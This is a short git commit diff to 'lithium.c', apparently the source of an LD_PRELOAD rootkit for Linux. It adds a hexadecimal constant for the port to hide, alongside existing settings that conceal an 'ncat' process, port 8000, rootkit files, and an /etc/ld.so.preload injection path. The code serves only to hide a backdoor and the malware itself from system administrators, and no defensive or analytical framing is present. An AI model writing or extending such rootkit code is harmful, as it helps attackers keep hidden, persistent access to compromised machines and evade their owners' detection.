eeabcca9b030a34db2b16e8c130659a65069ede6
Marc Carlson <138807964+carls0n@users.noreply.github.com>
2026-09-04 04:34:09 -0700

    Add hexadecimal definition for PORT_TO_HIDE

--- lithium.c
+++ lithium.c
@@ -6,6 +6,7 @@
 /* ========================================================================== */
 #define NAME_TO_HIDE      "ncat"
 #define PORT_TO_HIDE       8000
+#define PORT_TO_HIDE_HEX  "1F40"
 #define HIDE_LIST         "secret_dir,lithium.so,ld.so.preload.dummy"
 #define PRELOAD_PATH      "/etc/ld.so.preload"
 #define DUMMY_PRELOAD     "/etc/ld.so.preload.dummy"
